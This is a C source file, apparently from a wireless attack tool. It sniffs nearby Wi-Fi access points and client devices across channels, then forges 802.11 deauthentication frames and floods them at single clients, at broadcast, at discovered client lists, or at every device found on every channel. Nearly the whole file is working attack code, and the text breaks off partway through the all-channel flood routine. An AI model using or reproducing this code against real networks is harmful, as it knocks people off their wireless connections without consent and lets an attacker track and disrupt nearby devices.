#include <stdlib.h>
#include <errno.h>
#include <stddef.h>
#include <stdio.h>
#include <readline/readline.h>
#include <readline/history.h>
#include <dirent.h>
#include <unistd.h>
#include <getopt.h>
#include <string.h>
#include <stdarg.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <time.h>
#include <poll.h>
#include <sys/select.h>

#include "shared.h"
#include "modules.h"
#include "yuwheel.h"
#include "yutheme.h"
#include "network.h"

static int build_deauth(uint8_t *frame, const uint8_t *ra, const uint8_t *ta, const uint8_t *bssid){
    memset(frame, 0 ,DEAUTH_FRAME_LEN);
    const uint8_t radiotap[8] = {0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00};
    const uint8_t FC_0 = 0xc0;
    const uint8_t FC_1 = 0x00;
    const uint8_t duration[2] = {0x00,0x00};
    const uint8_t *addr1 = ra;
    const uint8_t *addr2 = ta;
    const uint8_t *addr3 = bssid;
    const uint8_t seq[2] = {0x00,0x00};
    const uint8_t reason[2] = {0x07,0x00};

    memcpy(frame, radiotap, 8);
    frame[8] = FC_0;
    frame[9] = FC_1;
    memcpy(frame + 10, duration, 2);
    memcpy(frame + 12, addr1, 6);
    memcpy(frame + 18, addr2, 6);
    memcpy(frame + 24, addr3, 6);
    memcpy(frame + 30, seq, 2);
    memcpy(frame + 32, reason, 2);
    
    return DEAUTH_FRAME_LEN;
}

static int open_raw(struct sockaddr_ll *ll){
    unsigned int ifx = if_nametoindex(mon_iface);
    if(ifx == 0){ log_print("err", "Inteface not found: %s", mon_iface); return -1; }

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(fd == -1){ log_print("err", "Failed to start socket: %s", strerror(errno)); return -1; }

    memset(ll, 0, sizeof(*ll));
    ll->sll_family = AF_PACKET;
    ll->sll_ifindex = ifx;

    return fd;
}

static int single(const uint8_t *frame, int len){
    struct sockaddr_ll ll;
    int fd = open_raw(&ll);
    if(fd < 0){ return -1; }
    ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&ll, sizeof(ll));
    close(fd);
    
    if(n == len){return 0; }
    else{ return -1; }
}

static int flood(const uint8_t *frame, int len){
    struct sockaddr_ll ll;
    int fd = open_raw(&ll);
    if(fd < 0){ return -1; }

    int count_suc = 0;
    int count_fail = 0;
    int count_total = 0;
    int n_last_1 = 0;
    int n_last_15 = 0;
    double last_1 = getnsec();
    double last_15 = getnsec();
    running = 1;

    while(running){
        ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&ll, sizeof(ll));
        usleep(10000);

        if(n == len){ count_suc ++; n_last_1 ++;}
        else{ count_fail ++; }
        count_total = count_suc + count_fail;
        n_last_15 ++;

        int fail_threshold = count_fail % 500;
        if(!fail_threshold && count_fail){ log_print("warn", "Total %d frames send failed", count_fail); }

        double now = getnsec();
        if(now - last_1 >= 1 && n_last_1){
            log_print("suc", "%d frames sent", n_last_1);
            last_1 = now;
            n_last_1 = 0;
        }
        if(now - last_15 >= 15){ 
            log_print("info", "Total %d frames sent, speed %f fps, %d succeed, %d failed", count_total, n_last_15/(double)(now-last_15), count_suc, count_fail); 
            last_15 = now;
            n_last_15 = 0;
        }
    }
    close(fd);
    return 0;
}
static size_t hop_count(int mode){
    size_t n2 = sizeof(hop_2g)/sizeof(hop_2g[0]);
    size_t n5 = sizeof(hop_5g)/sizeof(hop_5g[0]);
    if(mode == HOP_2G){ return n2; }
    else if(mode == HOP_5G){ return n5; }
    else if(mode == HOP_ALL){ return (n2 + n5); }
    return n2;
}

static int hop_channel(int mode, size_t i){
    size_t n2 = sizeof(hop_2g)/sizeof(hop_2g[0]);
    size_t n5 = sizeof(hop_5g)/sizeof(hop_5g[0]);
    if(mode == HOP_2G){ return hop_2g[i % n2]; }
    else if(mode == HOP_5G){ return hop_5g[i % n5]; }
    else if(mode == HOP_ALL){ return (i < n2) ? hop_2g[i] : hop_5g[i - n2]; }
    return hop_2g[i % n2];
}

static int lookup_ap_ch(const uint8_t *bssid){
    for(int i = 0; i < n_ap; i++){
        if(memcmp(bssid, ap_list[i].bssid, 6) == 0){ return ap_list[i].ch; }
    }
    return -1;
}

int run_probe_ap(void){
    if(hop == HOP_OFF && ch <= 0){ log_print("err", "Hop mode off but no channel declared"); return -1; }

    struct sockaddr_ll ll;
    int fd = open_raw(&ll);
    if(fd < 0){ return -1; }
    ll.sll_protocol = htons(ETH_P_ALL);
    if( bind(fd, (struct sockaddr *)&ll, sizeof(ll)) != 0){ log_print("err", "Failed to bind socket to %s", mon_iface); close(fd); return -1; }

    int hop_snap = hop;
    size_t ih = 0;

    if(hop_snap == HOP_OFF){
        if(netlink_set_channel(mon_iface, ch)){ log_print("err", "Failed to set channel to %d", ch); close(fd); return -1; }
        log_print("info", "Sniffing APs on channel %d ...", ch);
    }else{
        log_print("info", "Hopping APs on %s channels ...", hop_names[hop_snap]);
    }

    uint8_t buf[4096];
    struct pollfd pfd  = { .fd = fd, .events = POLLIN};
    double last = getnsec();
    int n_last = 0;

    double hop_last = getnsec();
    const double DWELL = 0.25;

    running = 1;
    while(running){
        if(hop_snap != HOP_OFF){
            double tn = getnsec();
            if(tn - hop_last >= DWELL){
                ih = (ih + 1) % hop_count(hop_snap);
                if(netlink_set_channel(mon_iface, hop_channel(hop_snap, ih))){
                    if(errno == EINTR && !running){ continue; }
                    log_print("warn", "Hop to channel %d failed: %s", hop_channel(hop_snap, ih), strerror(errno));
                }
                else{ hop_last = tn; }
            }
        }

        int poll_to = (hop_snap != HOP_OFF) ? 50 : 500;
        if(poll(&pfd, 1, poll_to) <= 0){ continue; }
        

        int n = recvfrom(fd, buf, sizeof(buf), 0, NULL, NULL);
        if( n <= 0 ){ continue; }
        n_last++;

        double now = getnsec();
        if( now - last >= 15 && n_last ){
            log_print("info", "Got %d packets, latest %d bytes", n_last, n);
            last = now;
            n_last = 0;
        }

        if( n < 4 ){ continue; }
        int rt_len = buf[2] | (buf[3] << 8);
        if( rt_len >= n){ continue; }
        uint8_t *f = buf + rt_len;
        int flen = n - rt_len;

        if(flen < 38){ continue; }
        uint8_t fc0 = f[0];
        if( ((fc0 >> 2) & 0x03) != 0){ continue; }
        uint8_t sub = (fc0 >> 4) & 0x0F;
        if(sub != 8 && sub != 5){ continue; }
        uint8_t *bssid_f = f + 16;
        if(bssid_f[0] & 0x01){ continue; }
        if(memcmp(bssid_f, zeromac, 6) == 0){ continue; }

        char ssid_buf[33]; ssid_buf[0] = '\0';
        int ap_ch = -1;
        uint8_t *p = f + 36, *end = f + flen;
        while(p + 2 <= end){
            uint8_t tag = p[0], len = p[1];
            if(p + 2 + len > end){ break; }
            if(tag == 0){
                int l = len <= 32 ? len : 32;
                memcpy(ssid_buf, p+2, l);
                ssid_buf[l] = '\0';
                for(int k = 0; k < l; k++){
                    if(ssid_buf[k] < 32 || ssid_buf[k] > 126){ ssid_buf[k] = '?'; }
                }
            }else if(tag == 3 && len >= 1){
                ap_ch = p[2];
            }
            p += 2 + len;
        }
        if(ap_ch < 0){ ap_ch = (hop_snap == HOP_OFF) ? ch : hop_channel(hop_snap, ih); }
        if(ssid_buf[0] == '\0'){ snprintf(ssid_buf, sizeof(ssid_buf), "<null>"); }

        int idx = -1;
        for( int i = 0; i < n_ap; i++ ){
            if( memcmp(bssid_f, ap_list[i].bssid, 6) == 0 && ap_list[i].ch == ap_ch && strcmp(ap_list[i].ssid, ssid_buf) == 0 ){ idx = i ; break; }
        }
        if(idx >= 0){
            snprintf(ap_list[idx].lastseen, sizeof(ap_list[idx].lastseen), "%s", timestamp());
            continue;
        }

        if(n_ap < APS_MAX_RECORD){
            memcpy(ap_list[n_ap].bssid, bssid_f, 6);
            ap_list[n_ap].ch = ap_ch;
            snprintf(ap_list[n_ap].ssid, sizeof(ap_list[n_ap].ssid), "%s", ssid_buf);
            snprintf(ap_list[n_ap].lastseen, sizeof(ap_list[n_ap].lastseen), "%s", timestamp());

            char tmp[18];
            log_print("suc", "New AP found: %-22sch%-7d%s", mac2str(bssid_f, tmp), ap_ch, ssid_buf);
            n_ap++;
        }
    }

    close(fd);
    if(hop_snap != HOP_OFF && ch > 0){
        if(netlink_set_channel(mon_iface, ch)){ log_print("warn", "Cannot restore channel to %d", ch); }
        else{ log_print("info", "Restored channel to %d", ch); }
    }
    return 0;
}

int run_probe_client(void){

    struct sockaddr_ll ll;
    int fd = open_raw(&ll);
    if(fd < 0){ return -1; }
    ll.sll_protocol = htons(ETH_P_ALL);
    if( bind(fd, (struct sockaddr *)&ll, sizeof(ll)) != 0){ log_print("err", "Failed to bind socket to %s", mon_iface); close(fd); return -1; }

    char b[18];
    log_print("info", "Sniffing clients of %s on channel %d ...", mac2str(bssid, b), ch);

    uint8_t buf[4096];
    struct pollfd pfd  = { .fd = fd, .events = POLLIN};
    double last = getnsec();
    int n_last = 0;

    running = 1;
    while(running){
        if( poll(&pfd, 1, 500) <= 0 ){ continue; }

        int n = recvfrom(fd, buf, sizeof(buf), 0, NULL, NULL);
        if( n <= 0 ){ continue; }
        n_last++;

        double now = getnsec();
        if( now - last >= 15 && n_last ){
            log_print("info", "Got %d packets, latest %d bytes", n_last, n);
            last = now;
            n_last = 0;
        }

        if( n < 4 ){ continue; }
        int rt_len = buf[2] | (buf[3] << 8);
        if( rt_len >= n){ continue; }
        uint8_t *f = buf + rt_len;
        int flen = n - rt_len;

        if( flen < 24 ){ continue; }
        if( ((f[0] >> 2) & 0x03) != 2 ){ continue; }

        int tods = f[1] & 0x01;
        int fromds = (f[1] >> 1) & 0x01;
        uint8_t *a1 = f + 4;
        uint8_t *a2 = f + 10;
        uint8_t *sta = NULL;

        if(tods && !fromds){
            if(memcmp(bssid, a1, 6) == 0){ sta = a2; }
        }else if(!tods && fromds){
            if(memcmp(bssid, a2, 6) == 0){ sta = a1; }
        }
        if(!sta){ continue; }
        if(sta[0] & 0x01){ continue; }
        if(memcmp(sta, zeromac, 6) == 0){ continue; }

        int idx = -1;
        for( int i = 0; i < n_client; i++ ){
            if(memcmp(sta, client_list[i].mac, 6) == 0 && memcmp(bssid, client_list[i].ap_bssid, 6) == 0){ idx = i ; break; }
        }
        if(idx >= 0){
            snprintf(client_list[idx].lastseen, sizeof(client_list[idx].lastseen), "%s", timestamp());
            continue;
        }

        if(n_client < CLIENTS_MAX_RECORD){
            memcpy(client_list[n_client].mac, sta, 6);
            memcpy(client_list[n_client].ap_bssid, bssid, 6);
            snprintf(client_list[n_client].lastseen, sizeof(client_list[n_client].lastseen), "%s", timestamp());

            char tmp[18];
            log_print("suc", "New client found: %s", mac2str(sta, tmp));
            n_client++;
        }
    }
    close(fd);
    return 0;
}

int run_probe_carpet(void){

    struct sockaddr_ll ll;
    int fd = open_raw(&ll);
    if(fd < 0){ return -1; }
    ll.sll_protocol = htons(ETH_P_ALL);
    if( bind(fd, (struct sockaddr *)&ll, sizeof(ll)) != 0){ log_print("err", "Failed to bind socket to %s", mon_iface); close(fd); return -1; }

    size_t ih = 0;

    log_print("info", "Sniffing everything while hopping all channels ...");

    uint8_t buf[4096];
    struct pollfd pfd  = { .fd = fd, .events = POLLIN};
    double last = getnsec();
    int n_last = 0;

    double hop_last = getnsec();
    const double DWELL = 0.25;

    running = 1;
    while(running){
        double tn = getnsec();
        if(tn - hop_last >= DWELL){
            ih = (ih + 1) % hop_count(HOP_ALL);
            if(netlink_set_channel(mon_iface, hop_channel(HOP_ALL, ih))){
                if(errno == EINTR && !running){ continue; }
                log_print("warn", "Hop to channel %d failed: %s", hop_channel(HOP_ALL, ih), strerror(errno));
            }
            else{ hop_last = tn; }
        }

        if(poll(&pfd, 1, 50) <= 0){ continue; }
        

        int n = recvfrom(fd, buf, sizeof(buf), 0, NULL, NULL);
        if( n <= 0 ){ continue; }
        n_last++;

        double now = getnsec();
        if( now - last >= 15 && n_last ){
            log_print("info", "Got %d packets, latest %d bytes", n_last, n);
            last = now;
            n_last = 0;
        }

        if( n < 4 ){ continue; }
        int rt_len = buf[2] | (buf[3] << 8);
        if( rt_len >= n){ continue; }
        uint8_t *f = buf + rt_len;
        int flen = n - rt_len;

        if(flen < 26){ continue; }
        uint8_t type = (f[0] >> 2) & 0x03;
        uint8_t sub = (f[0] >> 4) & 0x0F;

        if(type == 0 && (sub == 5 || sub == 8)){
            uint8_t *bssid_f = f + 16;
            if(bssid_f[0] & 0x01){ continue; }
            if(memcmp(bssid_f, zeromac, 6) == 0){ continue; }

            char ssid_buf[33]; ssid_buf[0] = '\0';
            int ap_ch = -1;
            uint8_t *p = f + 36, *end = f + flen;
            while(p + 2 <= end){
                uint8_t tag = p[0], len = p[1];
                if(p + 2 + len > end){ break; }
                if(tag == 0){
                    int l = len <= 32 ? len : 32;
                    memcpy(ssid_buf, p+2, l);
                    ssid_buf[l] = '\0';
                    for(int k = 0; k < l; k++){
                        if(ssid_buf[k] < 32 || ssid_buf[k] > 126){ ssid_buf[k] = '?'; }
                    }
                }else if(tag == 3 && len >= 1){
                    ap_ch = p[2];
                }
                p += 2 + len;
            }
            if(ap_ch < 0){ ap_ch = hop_channel(HOP_ALL, ih); }
            if(ssid_buf[0] == '\0'){ snprintf(ssid_buf, sizeof(ssid_buf), "<null>"); }

            int idx = -1;
            for( int i = 0; i < n_ap; i++ ){
                if(memcmp(bssid_f, ap_list[i].bssid, 6) == 0 && ap_list[i].ch == ap_ch && strcmp(ssid_buf, ap_list[i].ssid) == 0){ idx = i ; break; }
            }
            if(idx >= 0){
                snprintf(ap_list[idx].lastseen, sizeof(ap_list[idx].lastseen), "%s", timestamp());
                continue;
            }

            if(n_ap < APS_MAX_RECORD){
                memcpy(ap_list[n_ap].bssid, bssid_f, 6);
                ap_list[n_ap].ch = ap_ch;
                snprintf(ap_list[n_ap].ssid, sizeof(ap_list[n_ap].ssid), "%s", ssid_buf);
                snprintf(ap_list[n_ap].lastseen, sizeof(ap_list[n_ap].lastseen), "%s", timestamp());

                char tmp[18];
                log_print("suc", "New AP found: %-22sch%-7d%s", mac2str(bssid_f, tmp), ap_ch, ssid_buf);
                n_ap++;
            }
        }else if(type == 2){
            int tods = f[1] & 0x01;
            int fromds = (f[1] >> 1) & 0x01;
            uint8_t *a1 = f + 4;
            uint8_t *a2 = f + 10;
            uint8_t *sta = NULL, *ap = NULL;

            if(tods && !fromds){ sta = a2; ap = a1; }
            else if(!tods && fromds){ sta = a1; ap = a2; }

            if(!sta){ continue; }
            if(sta[0] & 0x01){ continue; }
            if(memcmp(sta, zeromac, 6) == 0){ continue; }

            int idx = -1;
            for( int i = 0; i < n_client; i++ ){
                if(memcmp(sta, client_list[i].mac, 6) == 0 && memcmp(ap, client_list[i].ap_bssid, 6) == 0){ idx = i ; break; }
            }
            if(idx >= 0){
                snprintf(client_list[idx].lastseen, sizeof(client_list[idx].lastseen), "%s", timestamp());
                continue;
            }

            if(n_client < CLIENTS_MAX_RECORD){
                memcpy(client_list[n_client].mac, sta, 6);
                memcpy(client_list[n_client].ap_bssid, ap, 6);
                snprintf(client_list[n_client].lastseen, sizeof(client_list[n_client].lastseen), "%s", timestamp());

                char tmp[18];
                log_print("suc", "New client found: %s", mac2str(sta, tmp));
                n_client++;
            }
        }
    }

    close(fd);
    if(ch > 0){
        if(netlink_set_channel(mon_iface, ch)){ log_print("warn", "Cannot restore channel to %d", ch); }
        else{ log_print("info", "Restored channel to %d", ch); }
    }
    return 0;
}

int run_attack_deauth_unicast_single(void){
    running = 1;

    uint8_t frame[DEAUTH_FRAME_LEN];
    int len = build_deauth(frame, target, bssid, bssid);

    int r = single(frame, len);
    if(r < 0){ log_print("err", "Failed to send frame"); }
    else{ log_print("suc", "%d bytes sent", len); }
    return r;
}

int run_attack_deauth_unicast_flood(void){

    uint8_t frame[DEAUTH_FRAME_LEN];
    int len = build_deauth(frame, target, bssid, bssid);

    int r = flood(frame, len);
    return r;
}

int run_attack_deauth_broadcast_single(void){
    running = 1;

    uint8_t frame[DEAUTH_FRAME_LEN];
    int len = build_deauth(frame, broadmac, bssid, bssid);

    int r = single(frame, len);
    if(r < 0){ log_print("err", "Failed to send frame"); }
    else{ log_print("suc", "%d bytes sent", len); }
    return r;
}

int run_attack_deauth_broadcast_flood(void){

    uint8_t frame[DEAUTH_FRAME_LEN];
    int len = build_deauth(frame, broadmac, bssid, bssid);

    int r = flood(frame, len);
    return r;
}

int run_attack_deauth_serial_single(void){
    if(n_client == 0){ log_print("warn", "No any client in discovered list, run probe/client first"); return -1; }

    int n_hit = 0;
    for(int i = 0; i < n_client; i++){
        if(memcmp(bssid, client_list[i].ap_bssid, 6) == 0){ n_hit++; }
    }
    if(n_hit == 0){ char tmp[18]; log_print("warn", "No client of AP %s in discovered list, run probe/client first", mac2str(bssid, tmp)); return -1; }

    char tmp[18];
    log_print("info", "Picked %d client(s) of AP %s from discovered list", n_hit, mac2str(bssid, tmp));

    running = 1;
    for(int i = 0; i < n_client; i++){
        if(memcmp(bssid, client_list[i].ap_bssid, 6) != 0){ continue; }
        uint8_t frame[DEAUTH_FRAME_LEN];
        int len = build_deauth(frame, client_list[i].mac, client_list[i].ap_bssid, client_list[i].ap_bssid);
        if(single(frame, len) < 0){ char tmp[18]; log_print("warn", "Failed to send frame to client %s, skipped", mac2str(client_list[i].mac, tmp)); continue; }
        else{ char tmp[18]; log_print("suc", "%d bytes send to client %s", len, mac2str(client_list[i].mac, tmp)); }
    }

    return 0;
}

int run_attack_deauth_serial_flood(void){
    if(n_client == 0){ log_print("warn", "No any client in discovered list, run probe/client first"); return -1; }

    int hit[CLIENTS_MAX_RECORD];
    int n_hit = 0;
    for(int i = 0; i < n_client; i++){
        if(memcmp(bssid, client_list[i].ap_bssid, 6) == 0){ hit[n_hit++] = i; }
    }
    if(n_hit == 0){ char tmp[18]; log_print("warn", "No client of AP %s in discovered list, run probe/client first", mac2str(bssid, tmp)); return -1; }

    char tmp0[18], tmp1[18];
    log_print("info", "Picked %d client(s) of AP %s from discovered list", n_hit, mac2str(bssid, tmp0));
    log_print("info", "Flooding %d client(s) of AP %s on channel %d ...", n_hit, mac2str(bssid, tmp1), ch);

    struct sockaddr_ll ll;
    int fd = open_raw(&ll);
    if(fd < 0){ return -1; }

    int count_suc = 0;
    int count_fail = 0;
    int n_last_1 = 0;
    int n_last_15 = 0;
    double last_1 = getnsec();
    double last_15 = getnsec();

    running = 1;
    while(running){
        int fail_threshold = count_fail % 500;
        if(!fail_threshold && count_fail){ log_print("warn", "Total %d frames send failed", count_fail); }
                
        double now = getnsec();
        if(now - last_1 >= 1 && n_last_1){
            log_print("suc", "%d frames sent", n_last_1);
            last_1 = now;
            n_last_1 = 0;
        }
        if(now - last_15 >= 15){ 
            log_print("info", "Total %d frames sent, speed %f fps, %d succeed, %d failed", count_fail + count_suc, n_last_15/(double)(now-last_15), count_suc, count_fail); 
            last_15 = now;
            n_last_15 = 0;
        }


        for(int k = 0; k < n_hit; k++){
            int i = hit[k];
            uint8_t frame[DEAUTH_FRAME_LEN];
            int len = build_deauth(frame, client_list[i].mac, client_list[i].ap_bssid, client_list[i].ap_bssid);

            ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&ll, sizeof(ll));

            if(n != len){ count_fail++; char tmp[18]; log_print("warn", "Failed to send frame to client %s", mac2str(client_list[i].mac, tmp)); }
            else{ count_suc++; n_last_1++; }
            n_last_15++;
        }
        usleep(10000);
    }


    close(fd);
    return 0;
}

int run_attack_deauth_roster_single(void){
    if(n_client == 0){ log_print("warn", "No any client in discovered list, run probe/client first"); return -1; }

    log_print("info", "Picked %d client(s) from discovered list", n_client);

    running = 1;
    for(int i = 0; i < n_client; i++){
        uint8_t frame[DEAUTH_FRAME_LEN];
        int len = build_deauth(frame, client_list[i].mac, client_list[i].ap_bssid, client_list[i].ap_bssid);

        int ap_ch = lookup_ap_ch(client_list[i].ap_bssid);
        if(ap_ch <= 0){ char tmp[18]; log_print("warn", "Cannot lookup AP channel for client %s, skipped", mac2str(client_list[i].mac, tmp)); continue; }
        if(netlink_set_channel(mon_iface, ap_ch)){ log_print("warn", "Cannot switch channel to %d, skipped", ap_ch); continue; }

        if(single(frame, len) < 0){ char tmp[18]; log_print("warn", "Failed to send frame to client %s, skipped", mac2str(client_list[i].mac, tmp)); continue; }
        else{ char tmp[18]; log_print("suc", "%d bytes send to client %s", len, mac2str(client_list[i].mac, tmp)); }
    }

    if(ch > 0){
        if(netlink_set_channel(mon_iface, ch)){ log_print("warn", "Cannot restore channel to %d", ch); }
        else{ log_print("info", "Restored channel to %d", ch); }
    }
    return 0;
}

int run_attack_deauth_roster_flood(void){
    if(n_client == 0){ log_print("warn", "No any client in discovered list, run probe/client first"); return -1; }

    log_print("info", "Picked %d client(s) from discovered list", n_client);

    int cch[CLIENTS_MAX_RECORD];
    int n_skip = 0;
    for(int i = 0; i < n_client; i++){
        cch[i] = lookup_ap_ch(client_list[i].ap_bssid);
        if(cch[i] <= 0){ n_skip++; }
    }

    int chs[32];
    int n_ch = 0;
    for(int i = 0; i < n_client; i++){
        if(cch[i] <= 0){ continue; }
        int dup = 0;
        for(int j = 0; j < n_ch; j++){ if(chs[j] == cch[i]){ dup = 1; break; } }
        if(!dup && n_ch < 32){ chs[n_ch++] = cch[i]; }
    }

    if(n_ch == 0){ log_print("err", "Failed to resolve channel of any client"); return -1; }
    if(n_skip){ log_print("warn", "%d client(s) skipped (channel unknown)", n_skip); }

    struct sockaddr_ll ll;
    int fd = open_raw(&ll);
    if(fd < 0){ return -1; }

    log_print("info", "Flooding %d client(s) on %d channel(s) ...", n_client - n_skip, n_ch);

    const double DWELL = 0.5;
    int ci = 0;
    uint8_t frame[DEAUTH_FRAME_LEN];
    int count_fail = 0, count_suc = 0, n_last_1 = 0, n_last_15 = 0;
    double last_1 = getnsec(), last_15 = getnsec(), hop_last = getnsec();

    if(netlink_set_channel(mon_iface, chs[0])){ log_print("warn", "Hop to channel %d failed: %s", chs[0], strerror(errno)); }

    running = 1;
    while(running){
        double now = getnsec();
        if(now - hop_last >= DWELL){
            ci = (ci + 1) % n_ch;
            if(netlink_set_channel(mon_iface, chs[ci]) == 0){ hop_last = now; }
            else{ log_print("warn", "Hop to channel %d failed: %s", chs[ci], strerror(errno)); }
        }

        double tn = getnsec();
        if(tn - last_1 >= 1 && n_last_1){
            log_print("suc", "%d frames sent", n_last_1);
            n_last_1 = 0; last_1 = tn;
        }
        if(tn - last_15 >= 15){
            log_print("info", "Total %d frames sent, speed %f fps, %d succeed, %d failed", count_fail + count_suc, n_last_15/(double)(tn-last_15), count_suc, count_fail);
            n_last_15 = 0; last_15 = tn;
        }

        for(int i = 0; i < n_client; i++){
            if(cch[i] != chs[ci]){ continue; }
            int len = build_deauth(frame, client_list[i].mac, client_list[i].ap_bssid, client_list[i].ap_bssid);
            ssize_t n = sendto(fd, frame, len, 0, (struct sockaddr *)&ll, sizeof(ll));
            if(n != len){ count_fail++; }
            else{ count_suc++; n_last_1++; }
            n_last_15++;
        }
        usleep(10000);
    }

    close(fd);
    if(ch > 0){
        if(netlink_set_channel(mon_iface, ch)){ log_print("warn", "Cannot restore channel to %d", ch); }
        else{ log_print("info", "Restored channel to %d", ch); }
    }

    return 0;
}

int run_attack_deauth_carpet_single(void){

    struct sockaddr_ll ll;
    int fd = open_raw(&ll);
    if(fd < 0){ return -1; }
    ll.sll_protocol = htons(ETH_P_ALL);
    if( bind(fd, (struct sockaddr *)&ll, sizeof(ll)) != 0){ log_print("err", "Failed to bind socket to %s", mon_iface); close(fd); return -1; }

    uint8_t buf[4096];
    struct pollfd pfd  = { .fd = fd, .events = POLLIN};
    double hop_last = getnsec();
    const double DWELL = 0.25;
    int ih = 0;

    typedef struct {
        int ch;
        uint8_t ap[6];
        uint8_t mac[6];
    } target_t;
    
    target_t targets[CLIENTS_MAX_RECORD];
    int n_targets = 0;

    log_print("info", "Probing clients on all channels for 15s ...");

    running = 1; double begin = getnsec();
    while(running && getnsec() - begin < 15){
        double tn = getnsec();
        if(tn - hop_last >= DWELL){
            ih = (ih + 1) % hop_count(HOP_ALL);
            if(netlink_set_channel(mon_iface, hop_channel(HOP_ALL, ih))){
                if(errno == EINTR && !running){ continue; }
                log_print("warn", "Hop to channel %d failed: %s", hop_channel(HOP_ALL, ih), strerror(errno));
            }
            else{ hop_last = tn; }
        }

        if( poll(&pfd, 1, 500) <= 0 ){ continue; }

        int n = recvfrom(fd, buf, sizeof(buf), 0, NULL, NULL);
        if( n <= 0 ){ continue; }

        if( n < 4 ){ continue; }
        int rt_len = buf[2] | (buf[3] << 8);
        if( rt_len >= n){ continue; }
        uint8_t *f = buf + rt_len;
        int flen = n - rt_len;

        if( flen < 24 ){ continue; }
        if( ((f[0] >> 2) & 0x03) != 2 ){ continue; }

        int tods = f[1] & 0x01;
        int fromds = (f[1] >> 1) & 0x01;
        uint8_t *a1 = f + 4;
        uint8_t *a2 = f + 10;
        uint8_t *sta = NULL, *ap = NULL;

        if(tods && !fromds){ sta = a2; ap = a1; }
        else if(!tods && fromds){ sta = a1; ap = a2; }

        if(!sta){ continue; }
        if(sta[0] & 0x01){ continue; }
        if(memcmp(sta, zeromac, 6) == 0){ continue; }

        int is_exist = 0;
        for(int i = 0; i < n_targets; i++){
            if(memcmp(sta, targets[i].mac, 6) == 0 && memcmp(ap, targets[i].ap, 6) == 0){ is_exist = 1; break; }
        }
        if(is_exist){ continue; }
        if(n_targets >= CLIENTS_MAX_RECORD){ log_print("warn", "Too many targets (over %d), list truncated", CLIENTS_MAX_RECORD); continue; }

        targets[n_targets].ch = hop_channel(HOP_ALL, ih);
        memcpy(targets[n_targets].mac, sta, 6);
        memcpy(targets[n_targets++].ap, ap, 6);
        char tmp[18]; log_print("info", "Target added: %s", mac2str(sta, tmp));
    }

    if(!running){ goto cleanup; }

    if(!n_targets){ log_print("warn", "No target client found, nothing was done"); goto cleanup; }
    log_print("info", "Probing done, %d target(s) found to attack", n_targets);

    int n_suc = 0, n_total = 0;

    running = 1;
    for(int i = 0; i < n_targets && running; i++){
        uint8_t frame[DEAUTH_FRAME_LEN];
        int len = build_deauth(frame, targets[i].mac, targets[i].ap, targets[i].ap);

        if(netlink_set_channel(mon_iface, targets[i].ch)){ log_print("warn", "Cannot switch channel to %d, skipped", targets[i].ch); continue; }

        if(single(frame, len) < 0){ char tmp[18]; log_print("warn", "Failed to send frame to client %s, skipped", mac2str(targets[i].mac, tmp)); continue; }
        else{ char tmp[18]; log_print("suc", "%d bytes send to client %s", len, mac2str(targets[i].mac, tmp)); n_suc++; n_total += len; }
    }

    log_print("info", "Total %d byte(s) sent to %d client(s), firing done", n_total, n_suc);

cleanup:
    close(fd);
    if(ch > 0){
        if(netlink_set_channel(mon_iface, ch)){ log_print("warn", "Cannot restore channel to %d", ch); }
        else{ log_print("info", "Restored channel to %d", ch); }
    }
    return 0;
}

int run_attack_deauth_carpet_flood(void){

    struct sockaddr_ll ll;
    int fd = open_raw(&ll);
    if(fd < 0){ return -1; }
    ll.sll_protocol = htons(ETH_P_ALL);
    if( bind(fd, (struct sockaddr *)&ll, sizeof(ll)) != 0){ log_print("err", "Failed to bind socket to %s", mon_iface); close(fd); return -1; }

    uint8_t buf[4096];

    int chs[32];
    int ci = 0;
    int n_ch = hop_count(HOP_ALL);
    for(int i = 0; i < n_ch; i++){ chs[i] = hop_channel(HOP_ALL, (size_t)i); }
    int cur_ch = chs[0];

    typedef struct {
        int ch;
        uint8_t ap[6];
        uint8_t mac[6];
    } target_t;
    
    target_t targets[CLIENTS_MAX_RECORD];
    int n_targets = 0;
    int is_full = 0;

    log_print("info", "Flooding clients on all channels ...");

    const double DWELL = 0.5;
    const double SEND_IVL = 0.1;
    double t_last_send[CLIENTS_MAX_RECORD] = {0};
    uint8_t frame[DEAUTH_FRAME_LEN];
    int count_fail = 0, count_suc = 0, n_last_1 = 0, n_last_15 = 0;
    double last_1 = getnsec(), last_15 = getnsec(), hop_last = getnsec();

    if(netlink_set_channel(mon_iface, chs[0])){ log_print("warn", "Hop to channel %d failed: %s", chs[0], strerror(errno)); }

    running = 1;
    while(running){
        double now = getnsec();
        if(now - hop_last >= DWELL){
            ci = (ci + 1) % n_ch;
            if(netlink_set_channel(mon_iface, chs[ci]) == 0){ cur_ch = chs[ci]; hop_last = now; }
            else if(errno == EINTR && !running){ break; }
            else{ log_print("warn", "Hop to channel %d failed: %s", chs[ci], strerror(errno)); }
        }

        double tn = getnsec();
        if(tn - last_1 >= 1 && n_last_1){
            log_print("suc", "%d frames sent", n_last_1);
            n_last_1 = 0; last_1 = tn;
        }
        if(tn - last_15 >= 15){
            log_print("info", "Total %d frames sent to %d target(s), speed %f fps, %d succeed, %d failed", count_fail + count_suc, n_targets, n_last_15/(double)(tn-last_15), count_suc, count_fail);
            n_last_15 = 0; last_15 = tn;
        }

        while(1){
            if(is_full){ goto send; }

            int rlen = recvfrom(fd, buf, sizeof(buf), MSG_DONTWAIT, NULL, NULL);
            if(rlen <= 0){
                if(errno != EAGAIN && errno != EWOULDBLOCK){ log_print("warn", "recvfrom error: %s", strerror(errno)); }
                break;
            }

            if( rlen < 4 ){ continue; }
            int rt_len = buf[2] | (buf[3] << 8);
            if( rt_len >= rlen){ continue; }
            uint8_t *f = buf + rt_len;
            int flen = rlen - rt_len;

            if(flen < 26){ continue; }
            uint8_t type = (f[0] >> 2) & 0x03;
            uint8_t sub = (f[0] >> 4) & 0x0F;

            if(type == 0 && sub == 12){ continue; }
            if(type != 2){ continue; }

            int tods = f[1] & 0x01;
            int fromds = (f[1] >> 1) & 0x01;
            uint8_t *a1 = f + 4, *a2 = f + 10;
            uint8_t *sta = NULL, *ap = NULL;

